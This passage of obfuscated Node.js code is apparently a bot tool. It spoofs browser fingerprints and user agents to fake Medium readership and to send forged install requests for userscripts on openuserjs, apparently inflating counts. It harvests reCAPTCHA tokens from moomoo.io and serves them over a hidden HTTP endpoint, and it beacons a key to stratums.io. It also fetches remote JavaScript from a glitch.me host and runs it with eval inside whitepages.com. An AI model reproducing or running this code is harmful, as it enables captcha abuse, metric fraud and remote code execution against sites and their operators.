      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': U(0x3) + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + U(0x14) + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': X(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + X(0x18) + 'me/108.0.0' + X(0x1f) + '537.36',
    'Mozilla/5.' + U(0xe) + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + X(0x7) + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + W(0x2, 'cVml') + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    X(0x9) + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1d15 * 0x1 + 0x581 * 0x7 + -0x972
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x384 + 0x6d2 + -0x34e)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xe37 + -0x1acc + -0x2967 * -0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xe32 * 0x1 + 0x2026 + -0x1190), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xb5 * -0xa + -0x4db * 0x7 + 0x1aeb;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x3 * -0xc89 + 0xe6a + 0x17 * -0x243; w < getRandomInt(0xa32 + -0x5 * -0x1f6 + -0x13ff, -0x1651 + -0x65a * -0x6 + -0x3 * 0x542); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1853f + 0xc513 + 0x2 * 0xd546);
        }
      }();
    }, -0xb95 * 0x1 + -0x12af + -0x3d5 * -0x8), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x191 * 0x1 + 0xc71 + -0xae0;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1771 + 0xaad + -0x16 * 0x18d, 0x90b + -0x459 * 0x3 + -0x219 * -0x2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1c * 0x18a + -0x1c99 * -0x1 + 0x2d7f);
    }, 0x2a7 + 0x83c * -0x1 + 0x5f9), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xd72 + 0x1181 * 0x2 + -0x1590;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x10d5 + -0x8 * -0x1cc + 0xe2d), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x3 * 0x2f + -0x2 * 0x1322 + 0x20b * 0x13), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x13 * -0x149cf + -0x13af81 + -0x39e57e * -0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xad * 0x1 + 0x1 * -0x2329 + 0x2 * 0x121d);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1a7 * 0x13 + 0x1 * 0x18b6 + 0x777);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1e75 + 0x3963 + 0x3848 * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = d,
    Z = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x2 * 0x12da + 0x530 * -0x1 + 0x29 * -0xcb) {
        const Y = c;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1 * 0x3fb + 0x1459 * -0x1 + 0x17d * 0xb));
        const C = A['indexOf']('Chrome/') + 'Chrome/' [Y(0x13)],
          D = A['slice'](C),
          E = D['slice'](-0xd * 0xb6 + -0xa96 * -0x3 + -0x1684, D['indexOf']('\x20'));
        return B ? E['slice'](0x8 * 0x3a6 + -0xb0 * -0x3 + 0x40 * -0x7d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2cea * 0x1 + -0x4 * -0x547 + 0x3da * -0x7),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xb17 + 0x2d1c + -0x50b * -0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + Z(0x19) + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0xa) + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + a0(0x5) + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
